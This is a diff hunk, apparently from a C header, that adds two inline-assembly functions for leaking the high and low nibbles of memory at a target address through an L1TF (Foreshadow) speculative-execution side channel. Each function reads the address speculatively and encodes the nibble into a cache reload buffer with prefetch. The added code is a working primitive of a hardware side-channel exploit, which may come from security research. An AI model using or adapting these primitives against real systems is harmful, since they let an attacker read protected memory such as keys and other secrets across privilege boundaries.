@@ -24,6 +24,42 @@ typedef uint8_t reload_buffer_t[AMOUNT_OF_NIBBLES_PER_RELOAD]
 typedef uint8_t full_reload_buffer_t[AMOUNT_OF_BYTE_OPTIONS][PAGE_SIZE];
 
 static inline __attribute__((always_inline)) void
+asm_l1tf_leak_high_nibble(void *leak_addr, reload_buffer_t reload_buffer) {
+  asm volatile("xor %%rax, %%rax\n"
+               "movl $0xB1ABE849, %%r12d\n"
+               "movl $0xCD7E16F1, %%r13d\n"
+               "leaq handler%=(%%rip), %%r14\n"
+               "movq (%[leak_addr]), %%rax\n"
+               "and $0xf0, %%rax\n"
+               "shl $0x8, %%rax\n"
+               "prefetcht0 (%[nibble], %%rax)\n"
+               "mfence\n"
+               "handler%=:"
+
+               ::[leak_addr] "r"(leak_addr),
+               [nibble] "r"(reload_buffer[0])
+               : "rax", "r12", "r13", "r14");
+}
+
+static inline __attribute__((always_inline)) void
+asm_l1tf_leak_low_nibble(void *leak_addr, reload_buffer_t reload_buffer) {
+  asm volatile("xor %%rax, %%rax\n"
+               "movl $0xB1ABE849, %%r12d\n"
+               "movl $0xCD7E16F1, %%r13d\n"
+               "leaq handler%=(%%rip), %%r14\n"
+               "movq (%[leak_addr]), %%rax\n"
+               "and $0x0f, %%rax\n"
+               "shl $0xc, %%rax\n"
+               "prefetcht0 (%[nibble], %%rax)\n"
+               "mfence\n"
+               "handler%=:"
+
+               ::[leak_addr] "r"(leak_addr),
+               [nibble] "r"(reload_buffer[1])
+               : "rax", "r12", "r13", "r14");
+}
+
+static inline __attribute__((always_inline)) void
 asm_l1tf_leak_nibbles(void *leak_addr, reload_buffer_t reload_buffer) {
   asm volatile("xor %%rax, %%rax\n"
                "xor %%rbx, %%rbx\n"
